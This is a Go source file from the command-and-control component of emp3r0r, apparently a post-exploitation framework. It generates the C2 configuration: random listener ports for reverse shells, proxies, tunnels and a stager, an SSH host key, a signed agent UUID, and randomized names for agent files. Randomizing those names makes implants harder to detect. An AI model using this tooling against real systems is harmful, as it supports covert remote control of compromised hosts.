package cc

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func save_config_json() (err error) {
	w_data, err := json.Marshal(RuntimeConfig)
	if err != nil {
		return fmt.Errorf("saving %s: %v", EmpConfigFile, err)
	}

	return os.WriteFile(EmpConfigFile, w_data, 0o600)
}

// InitConfigFile generate a new emp3r0r.json
func InitConfigFile(cc_host string) (err error) {
	// random ports
	RuntimeConfig.CCHost = cc_host
	RuntimeConfig.CCPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.AgentSocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ProxyChainBroadcastPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.SSHDShellPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ShadowsocksLocalSocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ShadowsocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.KCPServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.KCPClientPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.StagerHTTPListenerPort = fmt.Sprintf("%v", util.RandInt(1026, 65534))
	RuntimeConfig.CCTimeout = util.RandInt(10000, 20000)

	// SSH host key
	RuntimeConfig.SSHHostKey, _, err = tun.GenerateSSHKeyPair()
	if err != nil {
		return fmt.Errorf("failed to generate SSH host key: %v", err)
	}

	// random strings
	RuntimeConfig.AgentUUID = uuid.NewString()
	RuntimeConfig.AgentRoot = util.RandMD5String()
	RuntimeConfig.UtilsPath = util.RandMD5String()
	RuntimeConfig.SocketName = util.RandMD5String()
	RuntimeConfig.PIDFile = util.RandMD5String()
	RuntimeConfig.Password = util.RandStr(20)

	// time intervals
	RuntimeConfig.ProxyChainBroadcastIntervalMin = 30
	RuntimeConfig.ProxyChainBroadcastIntervalMax = 130
	RuntimeConfig.CCIndicatorWaitMin = 30
	RuntimeConfig.CCIndicatorWaitMax = 130
	RuntimeConfig.AgentSocksTimeout = 0 // disable timeout by default, leave it to the OS

	// sign agent UUID
	sig, err := tun.SignWithCAKey([]byte(RuntimeConfig.AgentUUID))
	if err != nil {
		return fmt.Errorf("failed to sign agent UUID: %v", err)
	}
	// base64 encode the sig
	RuntimeConfig.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)

	return save_config_json()
}

// LoadCACrt2RuntimeConfig CA cert to runtime config
func LoadCACrt2RuntimeConfig() error {
	err := tun.LoadCACrt()
	if err != nil {
		return err
	}
	RuntimeConfig.CAPEM = string(tun.CACrtPEM)
	RuntimeConfig.CAFingerprint = tun.GetFingerprint(CACrtFile)
	return nil
}
